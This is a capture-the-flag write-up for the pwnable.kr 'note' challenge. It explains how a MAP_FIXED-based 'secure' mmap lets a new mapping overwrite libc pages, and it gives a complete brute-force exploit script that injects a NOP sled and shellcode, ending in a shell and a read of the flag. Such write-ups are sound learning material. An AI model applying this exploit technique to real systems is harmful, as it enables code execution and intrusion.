# note - pwnable.kr

Third Grotesque category challenge I tackle; let's get started.

Checksec:
```shell
pwn checksec note
[*] '/home/sakal/pwnable/note/note'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

In this challenge, there's a loader and a `note` application. The only thing the loader does is disable ASLR and exec the `note` application, so it can be dismissed:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
        char* args[] = {"/usr/bin/setarch", "linux32", "-R", "/home/sakal/pwnable/note/note", 0};
        execve(args[0], args, 0);
        printf("execve failed!. tell admin\n");
        return 0;
}
```

When running the loader, there are these prints:
```shell
welcome to pwnable.kr

recently I noticed that in 32bit system with no ASLR,
 mmap(NULL... gives predictable address

I believe this is not secure in terms of software exploit mitigation
so I fixed this feature and called mmap_s

please try out this sample note application to see how mmap_s works
you will see mmap_s() giving true random address despite no ASLR

I think security people will thank me for this :)

- Select Menu -
1. create note
2. write note
3. read note
4. delete note
5. exit
```

So, there seems to be some sort of a hint towards the fact that mmap_s is not truly random, or simply very vulnerable. Let's keep that in mind.

Also, there's a note menu here that let's us create a note, write a note, read a note, and delete a note.

Let's open IDA and tackle this.

The main is not interesting:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("welcome to pwnable.kr\n");
  sleep(2u);
  puts("recently I noticed that in 32bit system with no ASLR,");
  puts(" mmap(NULL... gives predictable address\n");
  sleep(2u);
  puts("I believe this is not secure in terms of software exploit mitigation");
  puts("so I fixed this feature and called mmap_s\n");
  sleep(2u);
  puts("please try out this sample note application to see how mmap_s works");
  puts("you will see mmap_s() giving true random address despite no ASLR\n");
  sleep(2u);
  puts("I think security people will thank me for this :)\n");
  sleep(2u);
  select_menu();
  return 0;
}
```

But the `select_menu` function is:
```c
int select_menu()
{
  char s[1024]; // [esp+1Ch] [ebp-40Ch] BYREF
  int v2[3]; // [esp+41Ch] [ebp-Ch] BYREF

  puts("- Select Menu -");
  puts("1. create note");
  puts("2. write note");
  puts("3. read note");
  puts("4. delete note");
  puts("5. exit");
  __isoc99_scanf("%d", v2);
  clear_newlines();
  if ( v2[0] == 3 )
  {
    read_note();
  }
  else if ( v2[0] > 3 )
  {
    if ( v2[0] == 5 )
      return puts("bye");
    if ( v2[0] < 5 )
    {
      delete_note();
    }
    else
    {
      if ( v2[0] != 201527 )
        goto LABEL_16;
      puts("welcome to hacker's secret menu");
      puts("i'm sure 1byte overflow will be enough for you to pwn this");
      fgets(s, 1025, stdin);                   
    }
  }
  else if ( v2[0] == 1 )
  {
    create_note();
  }
  else
  {
    if ( v2[0] != 2 )
    {
LABEL_16:
      puts("invalid menu");
      return select_menu();
    }
    write_note();
  }
  return select_menu();
}
```

It seems to contain a secret menu functionality when you enter `0x31337`, that gives you a 1 byte overflow. That won't be relevant to us until later on. Also, the select_menu is recursive. This might be interesting to us, I do not know.

Let's look at the functions:
```c
int create_note()
{
  char *v1; // [esp+28h] [ebp-10h]
  int i; // [esp+2Ch] [ebp-Ch]

  for ( i = 0; i <= 255; ++i )
  {
    if ( !(&mem_arr)[i] )
    {
      v1 = (char *)mmap_s(0, 0x1000u, 7, 34, -1, 0);
      (&mem_arr)[i] = v1;
      return printf("note created. no %d\n [%08x]", i, v1);
    }
  }
  return puts("memory sults are fool");
}

int read_note()
{
  unsigned int v1[3]; // [esp+1Ch] [ebp-Ch] BYREF

  puts("note no?");
  __isoc99_scanf("%d", v1);
  clear_newlines();
  if ( v1[0] > 0x100 )
    return puts("index out of range");
  if ( (&mem_arr)[v1[0]] )
    return puts((&mem_arr)[v1[0]]);
  return puts("empty slut!");
}

char *write_note()
{
  unsigned int v1[3]; // [esp+1Ch] [ebp-Ch] BYREF

  puts("note no?");
  __isoc99_scanf("%d", v1);
  clear_newlines();
  if ( v1[0] > 0x100 )
    return (char *)puts("index out of range");
  if ( !(&mem_arr)[v1[0]] )
    return (char *)puts("empty slut!");
  puts("paste your note (MAX : 4096 byte)");
  return gets((&mem_arr)[v1[0]]);
}

int delete_note()
{
  int result; // eax
  unsigned int v1[3]; // [esp+1Ch] [ebp-Ch] BYREF

  puts("note no?");
  __isoc99_scanf("%d", v1);
  clear_newlines();
  if ( v1[0] > 0x100 )
    return puts("index out of range");
  if ( !(&mem_arr)[v1[0]] )
    return puts("already empty slut!");
  munmap((&mem_arr)[v1[0]], 0x1000u);
  result = v1[0];
  (&mem_arr)[v1[0]] = 0;
  return result;
}
```

`create_note` seems to simply iterate over the global `mem_arr` (which is of size 256), until it finds an uninitialized note. When it finds it, it uses `mmap_s` to allocate memory for it, and then saves the address in the `mem_arr`. If its all full, it returns a beautiful `puts`. It also prints the address for some reason.

`write_note` gets the note index you want to write to, and if it is initialized and not above 256, it let's you write whatever you want there. It is too bad, however, that they did not check for negative values. This gave us a `gets` primitive to a memory that we have a pointer to, as long as it is within the 32-bit address space from us (we're in 32 bit, so it is trivial). Not only that, but they `gets()` directly into the allocated `note` memory, which means we can write more than the allocated page, and overwrite other chunks. This function is super vulnerable, let's keep that in mind.

@note: 
When trying to input a negative number in write_note, I was very quickly met with the fact that I cannot do that due to the `jbe` usage instead of `jle`, which is an unsigned comparison.
![](/assets/images/writeups/note/image.png)
Therefore, the negative index bug is unfortunately not feasible.

`read_note` gets the index of the note you want to read, and if it is initialized and less than 256, simply calls `puts` on the memory. Good for leaks due to the fact the print can cause a leak if the `note` is full of data. 

`delete_note` seems significantly less interesting, simply getting a note number and calling `munmap` on in, and then setting `memarr[index] = NULL`.

And `mmap_s`:
```c
void *__cdecl mmap_s(unsigned int buf, size_t len, int prot, int flags, int a5, __off_t offset)
{
  int fd; // [esp+28h] [ebp-10h]
  void *v8; // [esp+2Ch] [ebp-Ch]

  if ( buf || (flags & 0x10) != 0 )
    return mmap((void *)buf, len, prot, flags, a5, offset);
  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
    exit(-1);
  if ( read(fd, &buf, 4u) != 4 )
    exit(-1);
  close(fd);
  for ( buf = buf & 0x7FFFF000 | 0x80000000; ; buf += 4096 )
  {
    v8 = mmap((void *)buf, len, prot, flags | 0x10, fd, offset);
    if ( v8 != (void *)-1 )
      break;
  }
  return v8;
}
```

note that we call mmap_s with flags `buf == null` and `flags = 0x22` so we actually are using this weird "secure `mmap`". Also, this code seems weird for two reasons; the first is the fact that the `fd` to `/dev/urandom` is passed on although it is closed, and the second are the flags which are used by the `mmap`. I used `man mmap` to read about them, and here are the flags I found which are used, specifically the one that is forced in the mmap_s code:
```c
#define MAP_FIXED 0x10
```

Let's read about it:
```
MAP_FIXED
              Don't interpret addr as a hint: place the mapping at
              exactly that address.  addr must be suitably aligned: for
              most architectures a multiple of the page size is
              sufficient; however, some architectures may impose
              additional restrictions.  If the memory region specified by
              addr and length overlaps pages of any existing mapping(s),
              then the overlapped part of the existing mapping(s) will be
              discarded.  If the specified address cannot be used, mmap()
              will fail.

              Software that aspires to be portable should use the
              MAP_FIXED flag with care, keeping in mind that the exact
              layout of a process's memory mappings is allowed to change
              significantly between Linux versions, C library versions,
              and operating system releases.  Carefully read the
              discussion of this flag in NOTES!
```

`If the memory region specified by addr and length overlaps pages of any existing mapping(s), then the overlapped part of the existing mapping(s) will be discarded.  If the specified address cannot be used, mmap() will fail.`  This sounds very vulnerable. That means, that contrary to the code of `mmap_s` that seems like every allocated chunk will simply be left as is, it actually discards the overlapped chunk (which will be the entire chunk)! This is an extremely strong primitive; let's plan our attack.

## Using Our Primitive

The first thing that popped to my mind is the fact that an address space that is in the higher 2GBs (which is where mmap_s forces the random addresses to be) is libc. 

What if we keep mapping a lot of addresses, until we reach a page in which we have a function we know is called (such as printf, puts, close, open)? It will cause the libc mapping to be removed, and the new page will be `rwx`, meaning we can run shellcode! 

Let's take it a step further; if we have a libc page, in which we know a function we can trigger is, we can simply overwrite that specific function with a shellcode, and then when we trigger it we'll execute our own shellcode.

Note that this is a brute-force of addresses; so depending on the code and the machine it takes a pretty long time (in remote).

## Exploitation

First things first, we need to map the interesting libc functions that we have in our binary:
```py
for sym in note.symbols:
    # Remove symbols we cannot get to.
    if sym in libc.symbols and sym not in ['setvbuf', 'sleep', '__libc_start_main']:  
        addr = libc_base + libc.symbols[sym]
        print(f"{sym}:{hex(addr)}")
        libc_addrs[sym] = addr
```

Afterwards, let's align it to a page address so we know what mappings interest us:
```py
page_addrs = {str(hex((addr & ~0xfff))[2:]): (sym, addr) for sym, addr in libc_addrs.items()}
```

Now, we want to allocate 256 addresses at a time, parse them, and then delete them:
```py
io.send(b'1\n' * 257)
output = io.recvuntil('memory sults', timeout=15) # Sometimes crashed randomly in remote...
matches = re.findall(r"note created\. no (\d+)\s*\n \[([0-9a-f]+)\]", output.decode())

# Parse addresses
for no, addr in matches:
    # Found a function address
    if addr in page_addrs:
        success(f"Found function page: {addr} {no} {page_addrs[addr]}")

        # Send write to the note.
        io.sendline(b'2')
        io.sendline(no)

        # Find the offset.
        func_addr = page_addrs[addr][1]
        offset = func_addr & 0xfff
        success(f"NOP sled size is {offset}")

        # Send the shellcode
        io.sendline(b'\x90' * offset + shellcode)
        io.interactive()

# Delete the other 256  
io.send(''.join([f'4\n{i}\n' for i in range(256)]))
```

When we piece it all together:
```py
note = ELF("note")
libc = ELF("libc.so.6")

# remote libc base, found via gdb. due to no ASLR it is constant.
libc_base = 0xf7d7d000
libc_addrs = {}

for sym in note.symbols:
    # Remove symbols we cannot get to.
    if sym in libc.symbols and sym not in ['setvbuf', 'sleep', '__libc_start_main']:  
        addr = libc_base + libc.symbols[sym]
        print(f"{sym}:{hex(addr)}")
        libc_addrs[sym] = addr

page_addrs = {str(hex((addr & ~0xfff))[2:]): (sym, addr) for sym, addr in libc_addrs.items()}

while True:
    io = start()
    try: 
        while True:
            io.send(b'1\n' * 257)
            # Sometimes crashed randomly in remote...
            output = io.recvuntil('memory sults', timeout=15) 
            if not output:
                raise EOFError()

            matches = re.findall(
                r"note created\. no (\d+)\s*\n \[([0-9a-f]+)\]", 
                output.decode()
            )

            # Parse addresses
            for no, addr in matches:
                # Found a function address
                if addr in page_addrs:
                    success(f"Found function page: {addr} {no} {page_addrs[addr]}")

                    # Send write to the note.
                    io.sendline(b'2')
                    io.sendline(no)

                    # Find the offset.
                    func_addr = page_addrs[addr][1]
                    offset = func_addr & 0xfff
                    success(f"NOP sled size is {offset}")

                    # Send the shellcode
                    io.sendline(b'\x90' * offset + shellcode)
                    io.interactive()

                # Delete the other 256  
                io.send(''.join([f'4\n{i}\n' for i in range(256)]))
    except EOFError:
        print(f"Crashed.. Addr index {index}")
        io.close()
```

When we run it in remote, we get:
```py
Got it! f7dee000 27 ('fgets', 4158580416)
offset is 1728
[*] Switching to interactive mode
 are fool
- Select Menu -
1. create note
2. write note
3. read note
4. delete note
5. exit
note no?
paste your note (MAX : 4096 byte)
- Select Menu -
1. create note
2. write note
3. read note
4. delete note
5. exit
$ 201527
welcome to hacker's secret menu
i'm sure 1byte overflow will be enough for you to pwn this
$ ls
flag
loader
loader.c
log
note
note.c
super.pl
$ cat flag
{flag_here}
```